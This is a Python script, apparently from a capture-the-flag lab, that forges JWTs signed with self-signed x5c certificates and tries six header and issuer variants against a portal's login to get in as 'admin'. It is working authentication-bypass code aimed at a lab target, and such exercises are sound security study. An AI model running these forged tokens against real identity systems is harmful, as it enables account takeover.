import sys, json, base64, time, datetime
sys.path.insert(0,'/home/ctfplayer/workspace')
import portal
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding

def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def mkkey(cn):
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, cn)])
    now = datetime.datetime.utcnow()
    cert = x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key()).serial_number(1).not_valid_before(now).not_valid_after(now+datetime.timedelta(days=365)).sign(key, hashes.SHA256())
    der = cert.public_bytes(serialization.Encoding.DER)
    return key, base64.b64encode(der).decode()

def sign(key, hdr, payload):
    msg = (b64e(json.dumps(hdr,separators=(',',':')).encode())+'.'+b64e(json.dumps(payload,separators=(',',':')).encode())).encode()
    sig = key.sign(msg, padding.PKCS1v15(), hashes.SHA256())
    return msg.decode()+'.'+b64e(sig)

def payload(iss='paleoid.example.com', sub='admin'):
    return {'iss':iss,'sub':sub,'aud':'trustdinoidc-portal','scope':'openid profile freeosaurus:redeem','exp':int(time.time())+3600}

# get real token
realtok = portal.get_token()
rh, rp, rs = portal.decode(realtok)
realx5c = rh['x5c'][0]

key, x5c = mkkey('paleoid.example.com')
keyevil, x5cevil = mkkey('evil.example.com')

cases = {}
# A: no x5c
cases['no x5c'] = sign(key, {'alg':'RS256','typ':'JWT'}, payload())
# B: x5c random bytes
cases['x5c garbage'] = sign(key, {'alg':'RS256','typ':'JWT','x5c':[base64.b64encode(b'hello').decode()]}, payload())
# C: x5c real cert but signed with our key
cases['real x5c, our key'] = sign(key, {'alg':'RS256','typ':'JWT','x5c':[realx5c]}, payload())
# D: our cert, iss evil
cases['our cert cn paleoid, iss evil'] = sign(key, {'alg':'RS256','typ':'JWT','x5c':[x5c]}, payload(iss='evil.example.com'))
# E: our cert CN evil
cases['cn evil, iss paleoid'] = sign(keyevil, {'alg':'RS256','typ':'JWT','x5c':[x5cevil]}, payload())
# F: our cert CN paleoid, sub guest
cases['cn paleoid sub guest'] = sign(key, {'alg':'RS256','typ':'JWT','x5c':[x5c]}, payload(sub='guest'))

for name, tok in cases.items():
    st, hd, body = portal.login(tok)
    print(f"{name:35s} -> {st} {body[:120]!r}")
EOF
